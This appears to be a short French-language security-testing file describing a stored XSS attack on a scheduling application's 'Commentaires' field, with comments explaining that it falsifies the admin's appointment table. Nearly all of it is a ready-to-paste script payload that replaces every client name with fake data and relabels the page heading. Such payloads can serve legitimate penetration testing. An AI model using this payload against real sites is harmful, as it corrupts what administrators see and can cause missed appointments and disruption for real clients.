// ATTAQUE XSS — FALSIFICATION DU PLANNING
// Champ ciblé : Commentaires
// Effet : tous les noms de clients affichés dans le tableau sont remplacés par de fausses données
//         l'admin voit un planning entièrement falsifié sans s'en rendre compte
// Danger réel : l'admin prend ses décisions (rappels, organisation) sur des données fausses
//               les vrais clients ne sont plus visibles — rendez-vous manqués, confusion totale
// Vérification : recharger la page après enregistrement, observer le tableau

// ===== PAYLOAD À COLLER =====
<script>document.querySelectorAll('.client-name').forEach(function(el,i){el.textContent='Client Inconnu '+(i+1);});document.querySelector('h1').textContent='Planning — DONN\u00c9ES CORROMPUES';</script>
